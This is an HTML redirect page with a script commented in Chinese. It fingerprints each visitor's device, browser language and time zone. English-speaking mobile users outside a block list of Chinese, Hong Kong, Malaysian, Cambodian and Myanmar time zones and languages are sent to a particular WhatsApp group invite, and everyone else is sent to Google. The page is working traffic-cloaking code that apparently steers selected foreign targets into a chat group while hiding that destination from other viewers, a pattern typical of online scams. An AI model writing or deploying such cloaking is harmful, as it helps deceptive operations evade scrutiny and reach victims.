<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        (function() {
            // ========== 获取关键信息 ==========
            
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            var lang = navigator.language || navigator.userLanguage || '';
            var langs = navigator.languages || [];
            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // ========== 屏蔽国家/地区时区列表 ==========
            
            var blockedTZ = [
                // 中国
                'Asia/Shanghai', 'Asia/Chongqing', 'Asia/Harbin', 'Asia/Urumqi',
                // 马来西亚
                'Asia/Kuala_Lumpur', 'Asia/Kuching',
                // 香港
                'Asia/Hong_Kong',
                // 柬埔寨
                'Asia/Phnom_Penh',
                // 缅甸
                'Asia/Yangon', 'Asia/Rangoon'
            ];
            
            // ========== 屏蔽国家/地区语言检测 ==========
            
            var isBlockedLang = lang.startsWith('zh') || 
                                lang.startsWith('ms') || 
                                lang.startsWith('ms-MY') ||
                                lang.startsWith('zh-HK') || 
                                lang.startsWith('yue') ||
                                lang.startsWith('km') || 
                                lang.startsWith('my') ||
                                langs.some(function(l) { 
                                    return l.startsWith('zh') || 
                                           l.startsWith('ms') || 
                                           l.startsWith('ms-MY') ||
                                           l.startsWith('zh-HK') || 
                                           l.startsWith('yue') ||
                                           l.startsWith('km') || 
                                           l.startsWith('my');
                                });
            
            // ========== 判断条件 ==========
            
            var isEnglish = lang.substr(0, 2).toLowerCase() === 'en';
            var isBlockedTZ = blockedTZ.indexOf(tz) !== -1;
            var shouldRedirect = isMobile && isEnglish && !isBlockedTZ && !isBlockedLang;
            
            // ========== 调试日志 ==========
            
            console.log('=== 判断信息 ===');
            console.log('手机端:', isMobile);
            console.log('英文语言:', isEnglish);
            console.log('时区:', tz);
            console.log('屏蔽时区:', isBlockedTZ);
            console.log('屏蔽语言:', isBlockedLang);
            console.log('浏览器语言:', lang);
            console.log('所有语言:', langs);
            console.log('最终结果:', shouldRedirect ? '✅ 跳转 WhatsApp' : '❌ 跳转 Google');
            console.log('屏蔽列表:', blockedTZ.join(', '));
            
            // ========== 跳转执行 ==========
            
            var targetUrl = "https://chat.whatsapp.com/GzlyDzWSFu69fQfxaJbk0m";
            var fallbackUrl = "https://www.google.com";
            
            window.location.replace(shouldRedirect ? targetUrl : fallbackUrl);
        })();
    </script>
</body>
</html>
